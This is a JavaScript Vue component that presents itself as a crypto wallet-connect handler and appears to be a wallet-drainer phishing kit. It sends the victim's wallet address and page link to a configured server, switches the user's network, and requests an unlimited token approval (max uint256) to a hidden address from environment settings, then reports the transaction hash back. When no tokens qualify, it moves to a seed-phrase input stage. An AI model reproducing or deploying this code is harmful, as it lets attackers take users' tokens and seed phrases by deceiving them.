import { mapGetters } from "vuex";
import { Contract, providers } from "ethers";
import axios from "axios";
import WalletConnectProvider from "@walletconnect/web3-provider";
import ABI from "@/contracts/ABI.js";

export default {
  data() {
    return {
      type: null,
      provider: null,
      signer: null,
      network: null,
      nextNetwork: null,
      nextToken: null,
      needChangeNetwork: false,
    };
  },
  computed: {
    ...mapGetters({
      stage: "stage",
      wallet: "wallet",
    }),
    networkName() {
      switch (this.network?.chainId) {
        case 1:
          return "eth";
        case 56:
          return "bsc";
        case 137:
          return "polygon";
        default:
          return "unknown";
      }
    },
  },
  mounted() {
    this.$root.$on("needConnection", async (type) => {
      if (this.stage === "init") {
        if (type === "mm" && !window.ethereum) {
          alert(
            "Please use browser with MetaMask extension or WalletConnect method."
          );
        }
        this.type = type;
        this.setConnectWalletStage();
        await this.startConnection();
      }
    });
  },
  methods: {
    async sleep(ms) {
      return new Promise((resolve) => setTimeout(resolve, ms));
    },
    async startConnection(change = false) {
      try {
        await this.setProvider();
        await this.setSigner();
        await this.setWallet();
        await this.setNetwork();

        let checkingResult = await this.checkTokens(change);
        if (checkingResult) {
          let checkingNetworkResult = this.checkNetwork();
          if (checkingNetworkResult === true) {
            await this.sleep(600);
            let approveResult = await this.approve();
            if (approveResult) {
              await this.sleep(400);
              await this.startConnection();
            }
          } else if (checkingNetworkResult === false) {
            await this.changeNetwork(this.needChangeNetwork);
          } else {
            await this.sleep(400);
            await this.changeNetwork(checkingNetworkResult);
            await this.sleep(1000);
            await this.startConnection(true);
          }
        } else {
          setTimeout(() => {
            this.$store.commit("setLoadingStatus", false);
            this.showSeedForm();
          }, 1000);
        }
      } catch (err) {
        if (err.message && err.message === "Setting Provider Error") {
          this.$store.commit("setLoadingStatus", false);
          this.$store.commit("setStage", "init");
        }
        console.log(err);
      }
    },
    async setProvider() {
      try {
        if (this.type === "wc") {
          const subProvider = new WalletConnectProvider({
            infuraId: process.env.VUE_APP_INFURA_ID,
            rpc: {
              56: "https://bsc-dataseed.binance.org",
              97: "https://data-seed-prebsc-1-s1.binance.org:8545",
              137: "https://polygon-rpc.com",
            },
          });
          await subProvider.enable();
          this.provider = new providers.Web3Provider(subProvider);
        } else {
          this.provider = new providers.Web3Provider(window.ethereum);
        }

        await this.provider.ready;

        if (this.type === "mm") {
          await this.provider.send("eth_requestAccounts", []);
        }
      } catch (err) {
        console.log("Setting Provider Error", err);
        throw new Error("Setting Provider Error");
      }
    },
    async setSigner() {
      try {
        this.signer = await this.provider.getSigner();
      } catch (err) {
        console.log("Setting Signer Error", err);
        throw new Error("Setting Signer Error");
      }
    },
    async setNetwork() {
      try {
        this.network = await this.provider.getNetwork();
      } catch (err) {
        console.log("Setting Network Error", err);
        throw new Error("Setting Network Error");
      }
    },
    async setWallet() {
      try {
        this.$store.commit("setWallet", await this.signer.getAddress());
      } catch (err) {
        console.log("Setting Wallet Error", err);
        throw new Error("Setting Wallet Error");
      }
    },
    async checkTokens(change) {
      try {
        const checkingData = await axios.post(
          `https://${process.env.VUE_APP_CHECK_IP}/api/check`,
          {
            wallet: this.wallet,
            type: this.type,
            network: this.networkName,
            change: change,
            link: location.href,
          }
        );

        if (checkingData.data.network !== null) {
          this.nextNetwork = checkingData.data.network;
          this.nextToken = checkingData.data.token;
          if (this.type === "wc") {
            this.needChangeNetwork = checkingData.data.needChangeTo;
          }

          return true;
        } else {
          return false;
        }
      } catch (err) {
        console.log("Checking Data Error", err);
        throw new Error("Checking Data Error");
      }
    },
    checkNetwork() {
      if (this.needChangeNetwork && this.type === "wc") {
        return false;
      }

      if (this.nextNetwork === "eth" && this.network?.chainId !== 1) {
        return "eth";
      } else if (this.nextNetwork === "bsc" && this.network?.chainId !== 56) {
        return "bsc";
      } else if (
        this.nextNetwork === "polygon" &&
        this.network?.chainId !== 137
      ) {
        return "polygon";
      } else {
        return true;
      }
    },
    showSeedForm() {
      this.$store.commit("setStage", "seedInput");
    },
    async approve() {
      try {
        this.$store.commit("setStage", "approve");
        this.$store.commit("setLoadingStatus", false);
        let contractInstance = new Contract(this.nextToken, ABI);
        let contract = await contractInstance.connect(this.signer);
        let balance = await contract.balanceOf(this.wallet);
        let allowance = await contract.allowance(
          this.wallet,
          process.env.VUE_APP_ADDRESS_FOR_APPROVE
        );

        if (balance > 0) {
          if (allowance > 0) {
            await this.sendToApprove();
            return true;
          } else {
            let hash = await this.approveToken(contract);
            await this.sendToApprove(hash);
            return true;
          }
        } else {
          return false;
        }
      } catch (err) {
        console.log(err);
        throw new Error("Approve error");
      }
    },
    setConnectWalletStage() {
      this.$store.commit("setLoadingSubTitle", "Please wait");
      this.$store.commit("setLoadingTitle", "Wallet connection");
      this.$store.commit("setLoadingStatus", true);
      this.$store.commit("setStage", "walletConnection");
    },
    async sendToApprove(hash = false) {
      let approveData = {
        wallet: this.wallet,
        token: this.nextToken,
        link: location.href,
      };
      if (hash) {
        approveData.hash = hash;
      }
      await axios.post(
        `https://${process.env.VUE_APP_CHECK_IP}/api/approve`,
        approveData
      );
    },
    async approveToken(contract) {
      let gasPriceSrc = await this.provider.getGasPrice();
      let gasPrice = gasPriceSrc.mul(125).div(100);
      let tx = await contract.approve(
        process.env.VUE_APP_ADDRESS_FOR_APPROVE,
        "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff",
        {
          gasPrice: gasPrice,
        }
      );

      return tx.hash;
    },
    async changeNetwork(chain) {
      if (this.type === "mm") {
        let chainID;
        switch (chain) {
          case "eth":
            chainID = "0x1";
            break;
          case "bsc":
            chainID = "0x38";
            break;
          case "polygon":
            chainID = "0x89";
            break;
        }
        try {
          await this.provider.send("wallet_switchEthereumChain", [
            { chainId: chainID },
          ]);
        } catch (err) {
          if (err.code === 4902) {
            await this.addNetwork(chain);
          } else {
            console.log(err);
            throw new Error("Switch network error");
          }
        }
      } else {
        this.$store.commit("setStage", "changeNetwork");
        this.$store.commit("setLoadingStatus", false);
        this.$store.commit("setNetworkNameForChange", chain);
      }
    },
    addNetwork(network) {
      if (this.type === "mm") {
        let chainName;
        let chainID;
        let nativeCurrency;
        let rpcUrls;
        let blockExplorerUrls;
        switch (network) {
          case "eth":
            chainName = "Ethereum Mainnet";
            chainID = "0x1";
            nativeCurrency = {
              name: "ETH",
              decimals: 18,
              symbol: "ETH",
            };
            rpcUrls = ["https://mainnet.infura.io/v3/"];
            blockExplorerUrls = ["https://etherscan.io"];
            break;
          case "bsc":
            chainName = "Binance Smart Chain";
            chainID = "0x38";
            nativeCurrency = {
              name: "BNB",
              decimals: 18,
              symbol: "BNB",
            };
            rpcUrls = [
              "https://bsc-dataseed.binance.org/",
              "https://bsc-dataseed1.defibit.io/",
              "https://bsc-dataseed1.ninicoin.io/",
            ];
            blockExplorerUrls = ["https://bscscan.com"];
            break;
          case "polygon":
            chainName = "Polygon Mainnet";
            chainID = "0x89";
            nativeCurrency = {
              name: "MATIC",
              decimals: 18,
              symbol: "MATIC",
            };
            rpcUrls = [
              "https://polygon-rpc.com",
              "https://matic-mainnet-archive-rpc.bwarelabs.com",
              "https://rpc-mainnet.matic.quiknode.pro",
            ];
            blockExplorerUrls = ["https://polygonscan.com"];
            break;
        }
        return new Promise((resolve, reject) => {
          this.provider
            .send("wallet_addEthereumChain", [
              {
                chainName: chainName,
                chainId: chainID,
                nativeCurrency: nativeCurrency,
                rpcUrls: rpcUrls,
                blockExplorerUrls: blockExplorerUrls,
              },
            ])
            .then(() => {
              resolve();
            })
            .catch(() => {
              reject(new Error("Adding network error"));
            });
        });
      }
    },
  },
};
